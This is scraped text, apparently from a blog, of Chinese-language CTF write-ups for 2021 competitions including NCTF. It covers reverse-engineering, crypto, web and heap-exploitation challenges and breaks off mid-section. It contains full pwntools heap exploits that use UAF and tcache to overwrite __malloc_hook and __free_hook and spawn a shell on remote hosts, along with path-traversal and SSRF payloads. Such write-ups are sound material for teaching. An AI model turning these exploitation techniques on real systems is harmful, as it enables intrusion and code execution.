ec 00 00 00 39 97 00 00 00 43 ed 00 00 00 39 96 00 00 00 39 e6 00 00 00 c1 06 9e f1 24 01 00 9f 11 3a ec 00 00 00 cb 39 e6 00 00 00 c1 07 9d 11 3a e6 00 00 00 cb ee be 39 ee 00 00 00 39 ec 00 00 00 f1 cf 28 at 1, fixup atom: rc4 at 7, fixup atom: sn at 13, fixup atom: i at 19, fixup atom: j at 25, fixup atom: k at 31, fixup atom: l at 37, fixup atom: m at 43, fixup atom: n at 49, fixup atom: un at 55, fixup atom: arr at 61, fixup atom: cipher at 67, fixup atom: i at 75, fixup atom: rc4 at 81, fixup atom: sn at 87, fixup atom: i at 93, fixup atom: j at 99, fixup atom: k at 105, fixup atom: l at 111, fixup atom: m at 117, fixup atom: n at 123, fixup atom: un at 129, fixup atom: arr at 135, fixup atom: cipher at 141, fixup atom: i at 147, fixup atom: &quot;2021quickjs_happygame&quot; at 153, fixup atom: un at 159, fixup atom: &quot;************************************&quot; at 165, fixup atom: sn at 260, fixup atom: &quot;32&quot; at 267, fixup atom: &quot;33&quot; at 275, fixup atom: &quot;34&quot; at 283, fixup atom: &quot;35&quot; at 289, fixup atom: arr at 298, fixup atom: m at 307, fixup atom: n at 315, fixup atom: l at 323, fixup atom: k at 329, fixup atom: rc4 at 334, fixup atom: sn at 339, fixup atom: un at 346, fixup atom: cipher at 356, fixup atom: i at 362, fixup atom: i at 367, fixup atom: cipher at 376, fixup atom: cipher at 381, fixup atom: i at 388, fixup atom: j at 394, fixup atom: j at 406, fixup atom: l at 414, fixup atom: l at 419, fixup atom: arr at 424, fixup atom: k at 433, fixup atom: m at 439, fixup atom: m at 447, fixup atom: n at 453, fixup atom: n at 459, fixup atom: k at 465, fixup atom: k at 471, fixup atom: i at 477, fixup atom: i at 487, fixup atom: m at 492, fixup atom: cipher at 501, fixup atom: n at 513, fixup atom: n at 524, fixup atom: n at 532, fixup atom: s at 540, fixup atom: n at 550, fixup atom: s at 555, fixup atom: String at 560, fixup atom: fromCharCode at 565, fixup atom: Number at 570, fixup atom: n at 584, fixup atom: s at 590, fixup atom: n at 599, fixup atom: n at 607, fixup atom: print at 612, fixup atom: s } debug {032b: de 03 01 20 00 48 01 00 4a 52 3f 40 00 7c 04 30 30 2b 2b 77 7b 5d 5d 6c 3f 0e 40 3f 4a b7 30 2b 3f cb 4e 0d filename: &quot;source.js&quot; } cpool {034f: 0e function {0350: 43 06 00 be 03 02 08 02 05 00 00 bb 01 0a name: rc4 args=2 vars=8 defargs=2 closures=0 cpool=0 stack=5 bclen=187 locals=10 vars {035e: e0 03 00 01 00 name: data0363: e2 03 00 01 00 name: key0368: e4 03 00 00 00 name: box036d: c2 03 00 01 00 name: i0372: e6 03 00 02 00 name: x0377: e8 03 00 03 00 name: temp037c: ea 03 00 04 00 name: y0381: ec 03 00 05 00 name: out0386: ee 03 00 06 00 name: code038b: c6 03 00 07 00 name: k } bytecode {0390: 39 94 00 00 00 c0 00 01 f1 cb b7 cc c8 c0 00 01 a5 ec 09 c7 c8 c8 4a 95 01 ee f2 b7 cd b7 cc c8 c0 00 01 a5 ec 2c c9 c7 c8 48 9f d4 43 f8 00 00 00 c8 d4 eb 9e 24 01 00 9f c0 00 01 9e cd c7 c8 48 ce c7 c8 72 c7 c9 48 4a c7 c9 ca 4a 95 01 ee cf b7 cd b7 c5 04 26 00 00 c5 05 b7 cc c8 d3 eb a5 ec 56 d3 43 f8 00 00 00 c8 24 01 00 c5 06 c9 b8 9f c0 00 01 9e cd c4 04 c7 c9 48 9f c0 00 01 9e c5 04 c7 c9 48 ce c7 c9 72 c7 c4 04 48 4a c7 c4 04 ca 4a c7 c9 48 c7 c4 04 48 9f c0 00 01 9e c5 07 c4 05 43 f9 00 00 00 c4 06 c7 c4 07 48 b0 24 01 00 0e 95 01 ee a6 c4 05 28 at 1, fixup atom: Array at 45, fixup atom: charCodeAt at 101, fixup atom: charCodeAt at 165, fixup atom: push } debug {044b: de 03 03 19 04 35 30 17 18 0d 30 7b 17 26 17 19 0d 12 1c 2c 40 2b 3f 17 2b 1d 4a 5d 17 filename: &quot;source.js&quot; } }source.js:3: function: rc4 args: data key locals: 0: var box 1: var i 2: var x 3: var temp 4: var y 5: var out 6: var code 7: var k stack_size: 5 opcodes: get_var Array push_i16 256 call1 1 put_loc0 0: box push_0 0 put_loc1 1: i 12: get_loc1 1: i push_i16 256 lt if_false8 27 get_loc0 0: box get_loc1 1: i get_loc1 1: i put_array_el inc_loc 1: i goto8 12 27: push_0 0 put_loc2 2: x push_0 0 put_loc1 1: i 31: get_loc1 1: i push_i16 256 lt if_false8 81 get_loc2 2: x get_loc0 0: box get_loc1 1: i get_array_el add get_arg1 1: key get_field2 charCodeAt get_loc1 1: i get_arg1 1: key get_length mod call_method 1 add push_i16 256 mod put_loc2 2: x get_loc0 0: box get_loc1 1: i get_array_el put_loc3 3: temp get_loc0 0: box get_loc1 1: i to_propkey2 get_loc0 0: box get_loc2 2: x get_array_el put_array_el get_loc0 0: box get_loc2 2: x get_loc3 3: temp put_array_el inc_loc 1: i goto8 31 81: push_0 0 put_loc2 2: x push_0 0 put_loc8 4: y array_from 0 put_loc8 5: out push_0 0 put_loc1 1: i 93: get_loc1 1: i get_arg0 0: data get_length lt if_false8 184 get_arg0 0: data get_field2 charCodeAt get_loc1 1: i call_method 1 put_loc8 6: code get_loc2 2: x push_1 1 add push_i16 256 mod put_loc2 2: x get_loc8 4: y get_loc0 0: box get_loc2 2: x get_array_el add push_i16 256 mod put_loc8 4: y get_loc0 0: box get_loc2 2: x get_array_el put_loc3 3: temp get_loc0 0: box get_loc2 2: x to_propkey2 get_loc0 0: box get_loc8 4: y get_array_el put_array_el get_loc0 0: box get_loc8 4: y get_loc3 3: temp put_array_el get_loc0 0: box get_loc2 2: x get_array_el get_loc0 0: box get_loc8 4: y get_array_el add push_i16 256 mod put_loc8 7: k get_loc8 5: out get_field2 push get_loc8 6: code get_loc0 0: box get_loc8 7: k get_array_el xor call_method 1 drop inc_loc 1: i goto8 93 184: get_loc8 5: out return0468: 0a bigint {0469: 00 }046a: 0a bigint {046b: 00 }046c: 0a bigint {046d: e8 01 07 len=70470: 44 b8 90 b5 6b 67 80 }0477: 0a bigint {0478: e8 01 07 len=7047b: 34 a7 b8 48 7f 8d af }0482: 0a bigint {0483: 00 }0484: 0a bigint {0485: 28 01 len=10487: fe }0488: 0a bigint {0489: 28 01 len=1048b: fe } } }source.js:1: function: &lt;eval&gt; locals: 0: var &lt;ret&gt; stack_size: 32 opcodes: check_define_var rc4,64 check_define_var sn,0 check_define_var i,0 check_define_var j,0 check_define_var k,0 check_define_var l,0 check_define_var m,0 check_define_var n,0 check_define_var un,0 check_define_var arr,0 check_define_var cipher,0 check_define_var i,0 fclosure8 0: [bytecode rc4] define_func rc4,0 define_var sn,0 define_var i,0 define_var j,0 define_var k,0 define_var l,0 define_var m,0 define_var n,0 define_var un,0 define_var arr,0 define_var cipher,0 define_var i,0 push_atom_value &quot;2021quickjs_happygame&quot; dup put_var un drop push_atom_value &quot;************************************&quot; dup put_var sn put_loc0 0: &quot;&lt;ret&gt;&quot; push_i16 150 push_i16 224 push_i16 244 push_i8 68 push_i8 61 push_i8 125 push_i8 8 push_i16 239 push_i16 203 push_i16 254 push_i16 241 push_i8 113 push_i16 213 push_i16 176 push_i8 64 push_i8 106 push_i8 103 push_i16 166 push_i16 185 push_i16 159 push_i16 158 push_i16 172 push_i8 9 push_i16 213 push_i16 239 push_i8 12 push_i8 100 push_i16 185 push_i8 90 push_i16 174 push_i8 107 push_i16 131 array_from 32 push_i16 223 define_field &quot;32&quot; push_i8 122 define_field &quot;33&quot; push_i16 229 define_field &quot;34&quot; push_i16 157 define_field &quot;35&quot; dup put_var arr drop push_const8 1: 0n dup put_var m put_loc0 0: &quot;&lt;ret&gt;&quot; push_const8 2: 0n dup put_var n put_loc0 0: &quot;&lt;ret&gt;&quot; push_0 0 dup put_var l put_loc0 0: &quot;&lt;ret&gt;&quot; push_0 0 dup put_var k put_loc0 0: &quot;&lt;ret&gt;&quot; get_var rc4 get_var sn get_var un call2 2 dup put_var cipher drop undefined put_loc0 0: &quot;&lt;ret&gt;&quot; push_0 0 dup put_var i drop 361: get_var i get_var cipher get_length lt if_false8 484 get_var cipher get_var i get_array_el dup put_var j put_loc0 0: &quot;&lt;ret&gt;&quot; get_var j push_i8 56 push_i8 17 sub xor dup put_var l put_loc0 0: &quot;&lt;ret&gt;&quot; undefined put_loc0 0: &quot;&lt;ret&gt;&quot; get_var l get_var arr get_var k get_array_el eq if_false8 446 get_var m post_inc put_var m put_loc0 0: &quot;&lt;ret&gt;&quot; goto8 458 446: get_var n post_inc put_var n put_loc0 0: &quot;&lt;ret&gt;&quot; 458: get_var k post_inc put_var k put_loc0 0: &quot;&lt;ret&gt;&quot; get_var i post_inc put_var i drop goto8 361 484: undefined put_loc0 0: &quot;&lt;ret&gt;&quot; get_var m get_var cipher get_length eq if_false8 520 get_var n push_0 0 eq if_false8 520 push_const8 3: 18071254662143010n dup put_var n put_loc0 0: &quot;&lt;ret&gt;&quot; goto8 529 520: push_const8 4: 24706849372394394n dup put_var n put_loc0 0: &quot;&lt;ret&gt;&quot; 529: push_empty_string dup put_var s put_loc0 0: &quot;&lt;ret&gt;&quot; undefined put_loc0 0: &quot;&lt;ret&gt;&quot; 539: get_var n push_const8 5: 0n gt if_false8 606 get_var s get_var String get_field2 fromCharCode get_var Number get_var n push_const8 6: 127n mod call1 1 call_method 1 add dup put_var s put_loc0 0: &quot;&lt;ret&gt;&quot; get_var n push_const8 7: 127n div dup put_var n put_loc0 0: &quot;&lt;ret&gt;&quot; goto8 539 606: get_var print get_var s call1 1 set_loc0 0: &quot;&lt;ret&gt;&quot; returnError... 审一下bytecode发现很简单，就是一个rc4，然后把密文异或了一下进行比对。(一大堆其实就是去数组，然后还有就比对，如果正确cout就＋1然后判断一下而已) 其中 get_var j push_i8 56 push_i8 17 sub xor 这里做得时候有点迷，然后自己写了一个js，然后编译，再看 如果是 j=(j-56)^17发现不对，然后想了一下堆栈，应该是（56-17）^j 最终exp： s=[150, 224, 244,68,61,125,8, 239, 203, 254, 241,113, 213, 176,64,106,103, 166, 185, 159, 158, 172,9, 213, 239,12,100, 185,90, 174,107, 131,223,122, 229,157]from Crypto.Cipher import ARC4key=b'2021quickjs_happygame'enc=[]for i in range(len(s)): enc.append((s[i])^(56-17))print(enc)enc=bytearray(enc)ar=ARC4.new(key)print(ar.decrypt(enc))# sn='************************************'#b'flag{2021_9u1ck_1s_v3r7_1nT3r3st1n9}' Webjava_url打开网站源代码有一个 /download?filename= 通过/download?filename=../../../../WEB-INF/web.xml方式下载WEB-INF/web.xml文件然后去读class文件，然后在反编译代码审计。 发现存在一个ssrf漏洞，并且过滤了一些协议不过这些协议可以绕过。 直接绕协议 /testURL?url=%0afile:///flag ez_python网刃杯原题 链接：https://www.wolai.com/atao/j1B9DkYnEVRtVhrdJ2FPr8?theme=light PwnK1ng_in_h3Ap_I解题思路 有uaf漏洞，输入666会给出printf的低六位，不用爆破了直接利用unsortedbin残余指针覆盖低位准确申请到stdout的上面，改写stdout泄露libc，最后用realloc调整rsp，打onegadget。 exp from pwn import *#p=process('./pwn')p=remote('47.104.175.110',20066)libc=ELF('/home/root2/Desktop/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc.so.6')def add(id,size): p.sendlineafter('&gt;&gt; ',str(1)) p.sendlineafter('input index:',str(id)) p.sendlineafter('input size:',str(size)) def delete(id): p.sendlineafter('&gt;&gt; ',str(2)) p.sendlineafter('input index:',str(id)) def edit(id,con): p.sendlineafter('&gt;&gt; ',str(3)) p.sendlineafter('input index:',str(id)) p.sendlineafter('input context:',str(con)) p.sendlineafter('&gt;&gt; ','666')p.recvuntil('0x')off=int(p.recv(6),16)-0x342810+0x6b25ddoff1=off&amp;0xffoff2=(off/0x100)&amp;0xffoff3=(off/0x10000)add(0,0xd0)add(1,0x60)add(2,0x10)delete(0)add(3,0x60)add(4,0x60)delete(4)delete(1)edit(1,'\\x00')edit(0,p8(off1)+p8(off2)+p8(off3))add(5,0x60)add(6,0x60)add(7,0x60)edit(7,'\\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\\x00')libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))-0x7f352f81c600+0x7f352f457000p.sendline('2')p.sendlineafter('input index:','5')delete(6)edit(6,p64(libc_base+libc.sym['__malloc_hook']-0x23))p.sendline('1')p.sendlineafter('input index:',str(7))p.sendlineafter('input size:',str(0x60))p.sendline('1')p.sendlineafter('input index:',str(8))p.sendlineafter('input size:',str(0x60))edit(8,'a'*(0x13-8)+p64(libc_base+0x4527a)+p64(8+libc_base+libc.sym['__libc_realloc']))p.interactive() Crybaby_rsa 首先enc2，给了n,e,c和n的一个因数(不是素数)，尽管这个通过这个因数可以求到其它三个因数和，但是已知三个因数和三个因数积也不能求出，但是明文是小于512比特的，而已知因数大于513，如果能分解的话就能直接用这个因数解 确实可以所以over Enc1显得迷茫些，只给了c，n都不给了，但是可以发现的是p是由幂指数产生的，而且比特位有个很小的范围，尽管v,m未知，至少m的范围很小，可以固定m的范围爆破最终求解，同样地，明文m&lt;p所以只需要用一个素数解，只需要爆破一个素数。 from gmpy2 import *from Crypto.Util.number import *#de2p=[191,193,627383,1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710491]n,phi=1,1for i in p: n*=i phi*=(i-1)e=65537d=invert(e,phi)c=40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083m=pow(c,d,n)print(long_to_bytes(m))#de1c=15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311e=65537for m in range(1023,-1,-1): print(m) for v in range(1023): p=pow(v,m+1)-pow(v+1,m) l=len(bin(p)[2:]) if l&gt;1024: d=invert(e,p-1) flag=long_to_bytes(pow(c,d,p)) if b'flag' in flag: print(flag) break break#flag{8102c552-3d78-4a42-b659-0c96ef827f05}","link":"/posts/11556/"},{"title":"2021NCTF比赛WP","text":"2021NCTF比赛WP MiscSignIn跳转链接到了https://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7D 所以得到flag NCTF{Welcome_to_NCTF_2021!} Hello File Format提示说1920*1080，然后看一下这个bin文件大小为6220800 发现这个大小正好是1920*1080*3 直接联想到了画图咯 from PIL import Imagepic = Image.new('RGB',(1920,1080),(255,255,255))f = open('GPU data.bin','rb').read()for i in range(1080): for j in range(1920): R,G,B = f[(j+i*1920)*3],f[(j+i*1920)*3+1],f[(j+i*1920)*3+2] pic.putpixel((j,i),(R,G,B))pic.show() NCTF{TGA_NOT_GTA} 做题做累了来玩玩游戏吧notepad++全局搜NCTF 访问那个链接就是flag了 http://h4ck.fun/g4me.txt NCTF{B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A} Pwnezheap思路有uaf漏洞，直先add+free一波接填满tcache并实现fastbin里出现重复chunk，用泄露函数直接泄露堆地址，然后申请到tcache控制结构体，修改记录tcache里chunk数量的部分，释放tcache控制结构体到unsortedbin，用泄露函数直接泄露libc地址，再打__free_hook就行了。exp from pwn import *#p=process('./ezheap')p=remote('129.211.173.64',10002)#context.log_level='debug'elf=ELF('./ezheap')libc=ELF(&quot;./libc-2.33.so&quot;)#libc=elf.libcdef menu(id): p.sendlineafter('&gt;&gt; ',str(id))def add(size,con): menu(1) p.sendlineafter('Size: ',str(size)) p.sendlineafter('Content: ',str(con))def edit(id,con): menu(2) p.sendlineafter('Index: ',str(id)) p.sendlineafter('Content: ',str(con))def delete(id): menu(3) p.sendlineafter('Index: ',str(id))def show(id): menu(4) p.sendlineafter('Index: ',str(id))for i in range(9): add(0x60,'aaaa')for i in range(9): delete(i)delete(7)show(7)heap=u64(p.recv(6).ljust(8,'\\x00'))-0x610success('heap:'+hex(heap))for i in range(7): add(0x60,'bbbb')add(0x60,p64(heap+0x10))add(0x60,'aaaa')add(0x60,'aaaa')add(0x60,'aaaa')edit(15,'\\xff'*0x60)delete(15)show(15)libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))-0x70-libc.sym['__malloc_hook']#gdb.attach(p)success('libc_base:'+hex(libc_base))add(0x80,'\\x00'*0x8+'\\x01'+'\\x00'*0x60)add(0x20,'\\x00'*0x10+p64(libc_base+libc.sym['__free_hook']))add(0x50,p64(libc_base+libc.sym['system']))add(0x20,'/bin/sh\\x00')delete(15)p.interactive() REHello せかい附件找不到了，总之就是签到题。 Shadowbringerc++64位程序，ida载入 std::string::string(v4, &quot;U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!&quot;, &amp;v6); std::allocator&lt;char&gt;::~allocator(&amp;v6); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(refptr__ZSt4cout, &quot;Welcome.Please input your flag:\\n&quot;); std::operator&gt;&gt;&lt;char&gt;(refptr__ZSt3cin, (std::string *)input); std::string::string((std::string *)v8, (const std::string *)input);// strcpy base64encode1((std::string *)v7, (std::string *)v8);// 换表的base64 std::string::operator=((std::string *)input, (const std::string *)v7);// 赋值 第一层密文 std::string::~string((std::string *)v7); std::string::~string((std::string *)v8); std::string::string((std::string *)v10, (const std::string *)input);// 复制一个对象v10 base64encode2((std::string *)v9, (std::string *)v10); // base64换表 两次 不同的表 std::string::operator=((std::string *)input, (const std::string *)v9); std::string::~string((std::string *)v9); std::string::~string((std::string *)v10); if ( (unsigned __int8)std::operator==&lt;char&gt;(input, v4) ) std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(refptr__ZSt4cout, &quot;Right.&quot;); else std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(refptr__ZSt4cout, &quot;Wrong.&quot;); std::string::~string((std::string *)v4); 主要用到了c++ string类来进行处理，结合动调，大致经过了两次base64变表加密，在和v4进行比较。第一组表， '#$%&amp;',27h,'()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]'+'^_`ab' 第二组表 'ba`_^]h[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210s.-,+*)(',27h,'&amp;''+'%$#' 两次加密的代码大致相同，主要通过表的长度和每次处理的二进制长度判断为base64. std::bitset&lt;8ull&gt;::to_string(v13, v14); // 转为2进制for ( j = 0; j &lt; (unsigned __int64)std::string::size((std::string *)&amp;v9); j += 6 )// 6个二进制一组v7 = (char *)std::string::operator[](&amp;hisoralce, v6);//表索引while ( (std::string::size(a1) &amp; 3) != 0 ) { std::operator+&lt;char&gt;(v19, a1, '!'); std::string::operator=(a1, (const std::string *)v19); std::string::~string((std::string *)v19); }//不为4的倍数就不断+! 了解流程后写解密脚本即可 import base64table1='#$%&amp;'+'\\x27'+'()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]'+'^_`ab'table2='ba`_^]h[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210s.-,+*)('+'\\x27'+'&amp;%$#'base='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'enc='U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!'#enc='FsJ7M?b&lt;U-&gt;2M&gt;U:'#123456789测试def newbase(enc,table): m='' for i in range(len(enc)): if enc[i] in table: m+=base[table.index(enc[i])] else: m+='=' print(base64.b64decode(m)) return base64.b64decode(m)c1=newbase(enc,table2).decode()newbase(c1,table1)#NCTF{H0m3_r1d1n9_h0m3_dy1n9_h0p3} 鲨鲨的秘密32位程序,ida载入 IpAdress = malloc(0x20u); VirtualProtect(IpAdress, 0x20u, 0x40u, &amp;flOldProtect); dword_404E48 = (int)IpAdress; *(_BYTE *)IpAdress = 0xC3; // ret的机器码 ((void (*)(void))IpAdress) 刚载入就有种莫名其妙的熟悉感，和西湖论剑的一道逆向题思路差不多，又是体力活。是一种修改代码的操作数并单语句执行的SMC，通过一个数组来确定赋值代码长度的大小，和选定相应的操作数和修改的位置。 挖出汇编代码，结合动调分析语句还原算法。 mov ds:dword_403474, 0FFFFFFFFh // mov output ,0xffffffffmov ecx, ds:dword_403464 // mov ecx,index(0) mov dl, byte ptr ds:VirtualProtect[ecx] // mov dl,input[0]mov byte ptr ds:dword_403470, dl // mov temp,dlmovzx eax, byte ptr ds:dword_403470 // mov eax, temp 输入传给eaxxor eax, ds:dword_403474 // xor eax,output 取反类似mov byte ptr ds:dword_403470, al // mov temp , al 保存取反的值movzx ecx, byte ptr ds:dword_403470 // mov ecx,temp and ecx, 0FFh // and ecx,0xffmov byte ptr ds:dword_403470, cl // mov temp,clmov edx, ds:dword_403474 // mov edx,output shr edx, 8 // shr edx,8mov ds:dword_403474, edx // mov output,edxmovzx eax, byte ptr ds:dword_403470 // mov eax,tempmov ecx, ds:dword_403474 // mov ecx,outputxor ecx, dword ptr ds:byte_403058[eax*4] // xor ecx, sbox[4*eax] //174841BC xor sbox[4*0x9e] 结果保存到outputmov ds:dword_403474, ecx mov edx, ds:dword_403464 ....mov al, [edx+403005h] mov byte ptr ds:dword_403470, al movzx ecx, byte ptr ds:dword_403470 xor ecx, ds:dword_403474 mov byte ptr ds:dword_403470, cl mov edx, ds:dword_403474shr edx, 8mov ds:dword_403474, edxmovzx eax, byte ptr ds:dword_403470mov ecx, ds:dword_403474xor ecx, dword ptr ds:byte_403058[eax*4] //xor ecx,sbox[4*eax] //eax 0xddmov ds:dword_403474, ecx //mov output,ecxmov edx, ds:dword_403474 //mov edx,outputxor edx, 0FFFFFFFFh //xor edx, 0FFFFFFFFhmov ds:dword_403474, edx //mov output edx python代码如下 input='a'*40output=0xfffffffffor index in range(0,40,2): tmp=(ord(input[index])^output)&amp;0xff output=output&gt;&gt;8 output=output^somebox[tmp] #print(&quot;%x %x&quot;%(tmp,output)) tmp = (ord(input[index+1]) ^ output) &amp; 0xff output = output &gt;&gt; 8 output = output ^ somebox[tmp] output=output^0xffffffff print(&quot;%x %x&quot; % (tmp, output)) 可知是两个字节为一组进行的处理，z3解因为涉及下标问题不好下手，所以直接爆破。 somebox=[0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D]enc=[0xC0F6605E, 0x00B16E0A, 0x3319A2D2, 0x57CAB7B7, 0x9A646D9C, 0xBDD82726, 0xD838FB91, 0x8DE10BB3, 0x176B0DAD, 0x685FDEEF, 0x2C1FF7B1, 0x6C444296, 0xA15CFE90, 0x20CD8721, 0x62967CE8, 0x2C1641FD, 0x572D0F9A, 0xAE52DC2C, 0x50497DCF, 0xFF6ABF4A]s=''enc=[0xC0F6605E, 0x00B16E0A, 0x3319A2D2, 0x57CAB7B7, 0x9A646D9C, 0xBDD82726, 0xD838FB91, 0x8DE10BB3, 0x176B0DAD, 0x685FDEEF, 0x2C1FF7B1, 0x6C444296, 0xA15CFE90, 0x20CD8721, 0x62967CE8, 0x2C1641FD, 0x572D0F9A, 0xAE52DC2C, 0x50497DCF, 0xFF6ABF4A]for i in range(20): for m in range(32,128): for n in range(32,128): output = 0xffffffff tmp=(m^output)&amp;0xff output=output&gt;&gt;8 output=output^somebox[tmp] #print(&quot;%x %x&quot;%(tmp,output)) tmp = (n ^ output) &amp; 0xff output = output &gt;&gt; 8 output = output ^ somebox[tmp] output=output^0xffffffff if output==enc[i]: s+=chr(m)+chr(n)print(s)#NCTF{rLdE57TG0iHA39qUnFZp6LeJyYEBcxMNL7} 狗狗的秘密挺不错的，解完想暴打出题人。32位程序，ida载入获得假flag一枚不过main之前有个TlsCallback函数，直接下个断点，动态分析。 if ( !v9 &amp;&amp; !IsDebuggerPresent() ) { off_825014 = (int (__cdecl *)(_DWORD))sub_823000; v8 = (unsigned int *)((char *)sub_823000 + 256); for ( i = 0; i &lt; 24; ++i ) v8 += 2; 